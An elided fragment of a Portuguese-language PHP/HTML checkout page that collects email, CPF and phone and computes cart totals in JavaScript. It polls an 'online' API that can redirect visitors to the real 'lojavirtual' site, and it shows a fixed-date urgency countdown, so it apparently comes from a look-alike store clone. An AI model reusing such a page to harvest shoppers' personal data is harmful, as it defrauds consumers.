...
if($_SESSION['session_index'] > time()){
		...
		if(isset($_SESSION["tempoCliente"])){
			unset($_SESSION["tempoCliente"]);
		}else{
		    unset($_SESSION["tempoCliente"]);
		}		
...
<script src="./arquivos/js.js?fake8=<?php echo time();?>"></script>

<script src="./js/checkout.js?fake9=<?php echo time();?>"></script>
<script src="./js/jquery.js?fake5=<?php echo time();?>"></script>
...
setInterval(()=>{
$.post("api/",{api:"online", cliente:"checkout"},function(retorno){
if(retorno==1){ window.location.href="https://www.lojavirtual.com.br/"; } else{ }
  ...
  document.getElementById("valorTotal2").innerHTML="R$ "+info;
  document.getElementById("valorTotal3").innerHTML="R$ "+info;
  document.getElementById("valorTotal4").innerHTML="R$ "+info;
  }
   
  var quantidade = 1;   
  var valorProduto = "<?php echo $valor;?>";
   
  var dados = {precoFinal:valorProduto, quantos:quantidade, click:0};
  localStorage.setItem('lojavirtual', JSON.stringify(dados));
 
  document.getElementById("resumoQtd").innerHTML="("+quantidade+")";
  
  function addQtd(){
  quantidade++;
  document.getElementById("quantityHTML").value=quantidade;
  document.getElementById("resumoQtd").innerHTML="("+quantidade+")";
  var multiplicar = valorProduto * quantidade;
  var totaValor = multiplicar.toLocaleString('pt-br', {minimumFractionDigits: 2});
  document.getElementById("valorTotal3").innerHTML="R$ "+totaValor;
  document.getElementById("valorTotal2").innerHTML="R$ "+totaValor;
  var dados = {precoFinal:totaValor, quantos:quantidade, click:1};
  localStorage.setItem('lojavirtual', JSON.stringify(dados));
  }
...
<i class="fa fa-clock-o"></i> Oferta termina em <span class="bold" data-countdown="2022-06-18 21:08:04" data-minutes="9">00:08:36</span>
        </div>
	...
	<div class="holder-cols-checkout">
		...
		<ul class="steps-checkout mb20 clearfix hide ">
			<li class="checkout-step enabled active">
				...
				<a href="javascript:" data-url="" class="link-abs active" data-target=".box-checkout"></a>
					...
					<a href="javascript:" data-url="" class="link-abs disabled" data-target=".box-checkout"></a>
				</li>
			...
			<li class="checkout-step disabled">
				...
				<a href="javascript:" class="link-abs " data-target=".box-checkout"></a>
			</li>		
		</ul>
		...
		<div class="clearfix col-checkout-holder">
			...
			<div class="col-checkout col-1">
				<div class="box-checkout box-customer active" data-target=".box-customer" data-url="#" data-next=".box-addresses">
    ...
    <div class="box-title">
        ...
        <div class="desc mb25">
            ...
            <form action="" method="POST" id="form-signup" class="form-horizontal clearfix text-left form-customer">

                <div class="form-group w-100 form-person-type remove-margin -custom-margin">
     
  </div>

                <div class="clearfix">
                    <div class="hp_field_wrap" style="display:none;"><input name="hp_field" type="text" value="" id="hp_field"><input name="hp_time" type="text" value="eyJpdiI6ImV0UmJVRE9xUTRNSU9JWkZUc0g5aFE9PSIsInZhbHVlIjoiMUNsSUFsNlQxSmpRTUxPMjJKQnJYUT09IiwibWFjIjoiOWQyMTIxYWQ3MWIzNzVmYjRlMGJmYjVmZTM1MTg2YWZiYmYyNzM3NTg0OTk3MzEyMjhkMGQwYjRjZTczM2YyMSJ9"></div>
  ...
  <div class="holder-input invalid">
    <input type="email" id="email1" name="email" class="input input-validate required email" value="" placeholder="ex.: maria@gmail.com">
  ...
  <span class="login-message hide red f11">
      ...
      <a href="" class="red underline" tabindex="-1">faça login.</a>
  </span>
</div>

        
        <div id="grouperror"class="form-group w-62 keep-size">
            <label for="cpf" class="label-control block">CPF</label>
            <div id="showcpf" class="holder-input invalid">
                <input type="tel" name="cpf" id="cpf" autocomplete="cpf" class="input input-validate required minlength cpf" minlength="14" value="" placeholder="000.000.000-00" maxlength="14">
            </div>
    ...
    <div id="homephone_errors" class="error-block"></div>
                ...
                <div class="clearfix js-password-check">
                        ...
                        <div class="holder-icheck holder-newsletter">
							...
							<input type="checkbox" id="cb-newsletter" name="newsletter" style="position: absolute; opacity: 0;"><ins class="iCheck-helper" style="position: absolute; top: 0%; left: 0%; display: block; width: 100%; height: 100%; margin: 0px; padding: 0px; background: rgb(255, 255, 255); border: 0px; opacity: 0;"></ins></div>
                ...
                <div class="form-group w-100 -custom-margin mt15">
                    <button id="button" onclick="chk()"  type="button" class="btn btn-primary btn-block btn-send" style="background:<?php echo $cor;?> !important;">
                        Continuar
...
<path d="M10.4913 0.083736L8.9516 1.66506C8.84623 1.7729 8.84652 1.94512 8.95215 2.05271L11.5613 4.71372L0.277266 4.71372C0.124222 4.71372 -3.2782e-07 4.83794 -3.21005e-07 4.99098L-2.22234e-07 7.20921C-2.1542e-07 7.36225 0.124222 7.48648 0.277266 7.48648L11.5613 7.48648L8.95216 10.1475C8.84678 10.2551 8.84652 10.427 8.9516 10.5348L10.4913 12.1162C10.5435 12.1699 10.615 12.2002 10.6899 12.2002C10.7647 12.2002 10.8363 12.1697 10.8884 12.1162L16.5579 6.29335C16.6103 6.23958 16.6366 6.16968 16.6366 6.10008C16.6366 6.03022 16.6103 5.96062 16.5579 5.90655L10.8884 0.083736C10.8363 0.0302186 10.7647 4.91753e-07 10.6899 4.94966e-07C10.615 4.98178e-07 10.5435 0.0302186 10.4913 0.083736Z"></path>
    ...
    Ao continuar, seus dados serão utilizados de forma totalmente segura para: Identificar seu perfil, histórico de compra, notificação de pedidos e carrinho de compras.
</div>
            </div>
        </div>
    ...
    <div class="overlay-spinner overlay-spinner-box">
        <div class="spinner spinner-grey"></div>
									...
									<div class="box-checkout box-addresses disabled" data-url="" data-target=".box-addresses">
	<div class="box-title">
		...
		<div class="spinner spinner-grey"></div>
			...
			<div class="col-checkout col-2">
				<div class="box-checkout box-payment disabled ">
...
<div class="col-checkout col-3">
    ...
    <div class="detail total bold" id="divtotalGeral">
        ...
        <div class="value js-cart-total" id="valorTotal3" style="color:<?php echo $cor;?> !important;"></div>
    </div>
    ...
    <div class="item-detail f12">
        ...
        <div class="item-row item-holder-quantity-price c-text medium">
                ...
                <div class="item-quantity-selector-holder js-item-quantity-selector-holder">
						...
						<button style="padding: 2px 17px !important; top: 58% !important;" onclick="addQtd()" class="more-button">
...
Receba sua compra ou nossa equipe devolverá todo seu dinheiro de volta na sua conta em poucos minutos.</div>
	...
	<div class="js-box-animation box-animation">
		<div class="box-content mt15" style="margin-top: 0px !important;">		
			<div class="holder-container-resume js-holder-container-resume" style="margin-top: 0px !important;">
            <div style="padding: 0px !important;" class="item-holder js-item-holder flex  " data-product-option-id="53830706" data-kit-id="" data-quantity="1" data-custom="" data-shopify-variant-id="" data-bundle-id="" data-shopify="0" data-order-bump-id="">
    <div class="item-image">
